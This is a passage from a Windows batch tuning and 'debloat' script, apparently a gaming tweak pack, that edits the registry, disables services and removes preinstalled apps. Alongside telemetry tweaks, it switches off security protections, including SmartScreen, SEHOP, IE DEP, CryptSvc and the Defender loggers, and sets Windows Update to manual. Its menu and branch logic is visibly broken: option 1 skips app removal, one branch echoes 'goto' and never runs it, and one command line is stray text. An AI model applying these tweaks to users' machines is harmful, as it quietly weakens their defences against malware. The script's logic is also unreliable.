Reg add "HKLM\SYSTEM\CurrentControlSet\Services\Origin Client Service" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\Origin Web Helper Service" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdatem" /v "Start" /t REG_DWORD /d "4" /f
Reg add "HKLM\SYSTEM\CurrentControlSet\Services\Steam Client Service" /v "Start" /t REG_DWORD /d "4" /f
@rem *** Disable Data Collection bloatwares ***
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v PreventDeviceMetadataFromNetwork /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontOfferThroughWUAU /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger" /v "Start" /t REG_DWORD /d 0 /f
@rem *** Disable Settings App unnecessary and telemetry Options ***
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v Enabled /t REG_DWORD /d 0 /f
REM - SmartScreen Filter for Store Apps: Disable
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f
REM - Let websites provide locally...
reg add "HKCU\Control Panel\International\User Profile" /v HttpAcceptLanguageOptOut /t REG_DWORD /d 1 /f
@REM Disabling Wifi Sense hotspot sharing
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v value /t REG_DWORD /d 0 /f
@REM WiFi Sense: Shared HotSpot Auto-Connect: Disable
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v value /t REG_DWORD /d 0 /f
@REM Change Windows Updates to "Notify to schedule restart"
reg add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v UxOption /t REG_DWORD /d 1 /f
@REM Disable Delivery Optimization P2P Update downlods outside of local network
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v DODownloadMode /t REG_DWORD /d 0 /f
@echo off
echo.
cls
Echo.
Echo. ←[101 41mThe Telemetry Tasks has been disabled←[%HEARTREALREALHEARTREAL:~2,1%%REALHEARTHEARTARTHEART:~4,1%
echo.
timeout 2 >nul
cls
::========================================================================================================================================
echo 1. Remove Preinstalled Apps
echo 2. Keep Preinstalled Apps
echo.
choice /C:123456789 /M "> Enter The Choice on the Keyboard: "
if errorlevel  1 goto:KeepApps
if errorlevel  2 goto:RemovePreinstalled
::========================================================================================================================================
:RemovePreinstalled
title RemovePreinstalled
@rem Debloat Windows
Remove Preinstalled Programs
PowerShell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *bing* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *people* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *solit* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsSoundRecorder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *windowscommunicationsapps* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *zune* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsMaps* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Sway* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *CommsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft.Messaging* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Facebook* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Twitter* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Drawboard PDF* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsFeedbackHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *BingWeather* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Office.OneNote* | Remove-AppxPackage"
goto:KeepApps
:KeepApps
title KeepApps
cls
::========================================================================================================================================
echo What is your System Type:
call :MsgBox "Are you a Desktop user?"  "VBYesNo+VBQuestion" "@SanGraphic QuickBoost"
if errorlevel 7 (
echo goto:LaptopPC
) else if errorlevel 6 (
echo goto:DesktopPC
)
::========================================================================================================================================
:DesktopPC

@REM Disabling PowerThrottling
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
goto:LaptopPC
:LaptopPC
Echo Disabling unnecessary System Services for less System Usage
@echo off
color b
cls
Echo Disabling unnecessary System Services for less System Usage
echo.
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TapiSrv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WpcMonSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PNRPsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\LanmanWorkstation" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WEPHOSTSVC" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\p2psvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\p2pimsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PhoneSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SensorDataService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SensrSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\perceptionsimulation" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\StiSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\OneSyncSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DevicePickerUserSvc" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc" /v Start /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DevicesFlowUserSvc" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WMPNetworkSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CaptureService" /v Start /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MessagingService" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v Start /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v Start /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v Start /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DeviceAssociationBrokerSvc" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cbdhsvc" /v Start /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\edgeupdatem" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\MicrosoftEdgeElevationService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ALG" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\IpxlatCfgSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\icssvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DusmSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\edgeupdate" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SensorService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\shpamsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\svsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SysMain" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Netlogon" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\CscService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\AppReadiness" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NfsClnt" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wisvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedRealitySvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RetailDemo" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lltdsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\CryptSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "DoSvc" /t REG_DWORD /d 3 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d 1 /f
reg add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocation" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableSensors" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc\Service\Configuration" /v "Status" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Permissions\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" /v "SensorPermissionState" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Sensor\Overrides\{BFA794E4-F964-4FDB-90F6-51056BFE4B44}" /v "SensorPermissionState" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DiagTrack" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\dmwappushsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TroubleshootingSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\DsSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient" /v "CorporateSQMURL" /t REG_SZ /d "0.0.0.0" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableSoftLanding" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Assistance\Client\1.0" /v "NoActiveHelp" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\ControlSet001\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\FileHistory" /v "Disabled" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Assistance\Client\1.0" /v "NoExplicitFeedback" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\MediaPlayer\Preferences" /v "UsageTracking" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "NoUseStoreOpenWith" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\FrameServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\InstallService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OSRSS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sedsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SENS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TabletInputService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Themes" /v "Start" /t REG_DWORD /d "4" /f
cls
echo Enabling Hardware Accelerated GPU Scheduling
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /F /V "HwSchMode" /T REG_DWORD /d "2"
@echo off
call :MsgBox "Would you like Full Screen Exclusive? lower input delay & better performance but 3 second Alt-tab (black screen)"  "VBYesNo+VBQuestion" "@SanGraphic"
if errorlevel 7 (
echo NO - don't
) else if errorlevel 6 (
echo YES - Enable
echo Enabling Full-screen Exclusive for lower input delay
Reg.exe delete "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /f
Reg.exe delete "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
)
echo Adding more ram for applications in system memory caching to improve microstuttering
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "1" /f
echo Paging executive is used to load system files such as kernel and hardware drivers to the page file when needed. Disable will force run into not virtual memory
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
echo Disabling Windows attempt to save as much RAM as possible  such as sharing pages for images  copy-on-write for data pages  and compression
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingCombining" /t REG_DWORD /d "1" /f
echo Disabling System energy-saving technique that reduces CPU power consumption by reducing the precision of software timers to allow the synchronization of process wake-ups  minimizing the number of times the CPU is forced to perform the relatively power-costly operation of entering and exiting idle states
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
echo Disable Automatic maintenance
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
echo Disable Preemption
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\GraphicsDrivers\Scheduler" /v "EnablePreemption" /t REG_DWORD /d "0" /f
echo Disable Hibernation
reg add "HKLM\System\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f
echo Disable fast startup
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
echo Disable Sleep study
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "SleepStudyDisabled" /t REG_DWORD /d "1" /f
echo Disable Aero shake
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DisallowShaking" /t REG_DWORD /d "1" /f
echo Speed up start time
reg add "HKCU\AppEvents\Schemes" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimeout" /t REG_DWORD /d "0" /f
echo Disable SEHOP (Credits - Bulgarian Tweaking Community)
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "KernelSEHOPEnabled" /t REG_DWORD /d "0" /f
echo Disable prefetcher and superfetch
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
echo Disable Consumer experiences from Microsoft
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
echo Disable WPP SOFTWARE tracing logs
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogEnable" /t REG_DWORD /d "0" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WUDF" /v "LogLevel" /t REG_DWORD /d "0" /f
echo Turn off data execution prevention
reg add "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Main" /v "DEPOff" /t REG_DWORD /d "1" /f
echo Disable DistributeTimers
Reg.exe delete "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /v "DistributeTimers" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\kernel" /f
echo Applying Optimal Win32Priority for balanced FPS and Latency
reg add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
echo Enabling Normal Priority for Fortnite
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\FortniteClient-Win64-Shipping.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "2" /f
echo Making menu more responsive by scar#1301
reg add "HKU\.DEFAULT\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f >NUL 2>&1
echo Disable System Auto-Loggers
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppModel" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Cellcore" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Circular Kernel Context Logger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\CloudExperienceHostOobe" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DataMarket" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog" /v "Start" /t REG_DWORD /d "1" /f
